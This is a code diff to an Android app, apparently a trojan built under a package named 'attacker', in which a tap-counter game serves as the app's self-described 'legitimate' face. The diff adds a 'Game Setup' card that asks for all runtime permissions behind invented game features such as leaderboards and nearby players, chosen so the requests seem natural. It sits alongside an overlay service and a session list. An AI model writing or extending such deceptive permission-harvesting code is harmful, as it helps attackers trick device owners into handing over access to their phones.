@@ -4,7 +4,9 @@ import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import androidx.activity.ComponentActivity
+import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.animation.core.*
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
@@ -29,6 +31,8 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import android.content.pm.PackageManager
+import androidx.core.content.ContextCompat
 import com.ghosttouch.attacker.service.OverlayService
 import com.ghosttouch.attacker.ui.sessions.SessionListActivity
 import com.ghosttouch.attacker.ui.theme.GhostColors
@@ -125,11 +129,30 @@ fun LauncherScreen() {
  * Tap counter mini game — the app's "legitimate" face.
  * Provides a reason for the app to exist and run in the background.
  */
+/**
+ * Tap game tab with integrated permission request flow.
+ *
+ * On first launch, shows a "game setup" card that requests all permissions
+ * with game-friendly justifications. The user sees "Enable Leaderboards",
+ * "Find Nearby Players", etc. — all feel natural for a mobile game.
+ *
+ * After permissions are granted, the tap game is fully playable.
+ */
 @Composable
 fun TapGameTab() {
+    val context = LocalContext.current
     var score by remember { mutableIntStateOf(0) }
     var highScore by remember { mutableIntStateOf(0) }
     val scale = remember { Animatable(1f) }
+    var permissionsGranted by remember { mutableIntStateOf(GamePermissions.getGrantedCount(context)) }
+    var showSetup by remember { mutableStateOf(GamePermissions.getPendingPermissions(context).isNotEmpty()) }
+
+    val permissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        permissionsGranted = GamePermissions.getGrantedCount(context)
+        showSetup = GamePermissions.getPendingPermissions(context).isNotEmpty()
+    }
 
     LaunchedEffect(score) {
         if (score > 0) {
@@ -141,9 +164,9 @@ fun TapGameTab() {
     Column(
         modifier = Modifier
             .fillMaxSize()
+            .verticalScroll(rememberScrollState())
             .padding(24.dp),
         horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.Center
     ) {
         Text(
             "TAP RUSH",
@@ -161,9 +184,106 @@ fun TapGameTab() {
             color = GhostColors.TextSecondary
         )
 
-        Spacer(modifier = Modifier.height(40.dp))
+        // ── Game Setup Card (permission request) ──
+        if (showSetup) {
+            Spacer(modifier = Modifier.height(20.dp))
 
-        // Tap target
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                shape = RoundedCornerShape(12.dp),
+                colors = CardDefaults.cardColors(
+                    containerColor = GhostColors.CyanAccent.copy(alpha = 0.1f)
+                )
+            ) {
+                Column(
+                    modifier = Modifier.padding(16.dp),
+                    verticalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    Text(
+                        "Game Setup",
+                        fontWeight = FontWeight.Bold,
+                        color = GhostColors.CyanAccent,
+                        fontSize = 16.sp
+                    )
+                    Text(
+                        "Enable game features for the best experience",
+                        color = GhostColors.TextSecondary,
+                        fontSize = 13.sp
+                    )
+
+                    Spacer(modifier = Modifier.height(4.dp))
+
+                    GamePermissions.groups.forEach { group ->
+                        val allGranted = group.permissions.all {
+                            ContextCompat.checkSelfPermission(context, it) ==
+                                    PackageManager.PERMISSION_GRANTED
+                        }
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .background(
+                                    GhostColors.SlateCard,
+                                    RoundedCornerShape(8.dp)
+                                )
+                                .padding(horizontal = 12.dp, vertical = 10.dp),
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Icon(
+                                if (allGranted) Icons.Default.CheckCircle else Icons.Default.RadioButtonUnchecked,
+                                contentDescription = null,
+                                tint = if (allGranted) GhostColors.CyanAccent else GhostColors.TextMuted,
+                                modifier = Modifier.size(18.dp)
+                            )
+                            Spacer(modifier = Modifier.width(10.dp))
+                            Column(modifier = Modifier.weight(1f)) {
+                                Text(
+                                    group.gameFeature,
+                                    color = GhostColors.TextPrimary,
+                                    fontSize = 13.sp,
+                                    fontWeight = FontWeight.SemiBold
+                                )
+                                Text(
+                                    group.gameDescription,
+                                    color = GhostColors.TextMuted,
+                                    fontSize = 11.sp
+                                )
+                            }
+                        }
+                    }
+
+                    Spacer(modifier = Modifier.height(4.dp))
+
+                    Button(
+                        onClick = {
+                            val pending = GamePermissions.getAllRuntimePermissions()
+                            permissionLauncher.launch(pending)
+                        },
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(8.dp),
+                        colors = ButtonDefaults.buttonColors(
+                            containerColor = GhostColors.CyanAccent
+                        )
+                    ) {
+                        Text(
+                            "Enable All Features",
+                            color = GhostColors.TextInverted,
+                            fontWeight = FontWeight.Bold
+                        )
+                    }
+
+                    TextButton(
+                        onClick = { showSetup = false },
+                        modifier = Modifier.align(Alignment.CenterHorizontally)
+                    ) {
+                        Text("Skip for now", color = GhostColors.TextMuted, fontSize = 12.sp)
+                    }
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(24.dp))
+
+        // ── Tap target ──
         Box(
             modifier = Modifier
                 .size(180.dp)
@@ -194,7 +314,7 @@ fun TapGameTab() {
             )
         }
 
-        Spacer(modifier = Modifier.height(32.dp))
+        Spacer(modifier = Modifier.height(24.dp))
 
         OutlinedButton(
             onClick = { score = 0 },
@@ -206,13 +326,12 @@ fun TapGameTab() {
             Text("Reset")
         }
 
-        Spacer(modifier = Modifier.height(24.dp))
-
+        // Feature status bar
+        Spacer(modifier = Modifier.height(16.dp))
         Text(
-            "Tap as fast as you can!",
-            fontSize = 14.sp,
-            color = GhostColors.TextMuted,
-            textAlign = TextAlign.Center
+            "$permissionsGranted/${GamePermissions.groups.size} game features enabled",
+            fontSize = 12.sp,
+            color = GhostColors.TextMuted
         )
     }
 }
